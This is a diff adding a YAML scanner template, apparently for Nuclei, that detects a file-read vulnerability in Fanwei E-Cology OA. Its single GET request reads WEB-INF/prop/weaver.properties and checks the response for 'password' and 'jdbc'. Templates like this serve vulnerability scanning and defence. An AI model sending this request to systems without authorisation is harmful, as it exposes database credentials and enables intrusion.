@@ -1,0 +1,27 @@
+id: fanweiOA-E-Cology-servlet_ResourceServlet-file-read
+info:
+  name: 泛微OA E-Cology org.springframework.web.servlet.ResourceServlet 文件读取漏洞
+  severity: medium
+  author: cnaq
+  description: 泛微E-Cology /weaver/org.springframework.web.servlet.ResourceServlet 存在文件读取漏洞，可读取数据库配置
+  reference: 
+    - https://github.com/jas502n/DBconfigReader
+  tags: fanwei,oa,ebridge,lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        condition: and
+        part: body
+        words:
+          - 'password'
+          - 'jdbc'
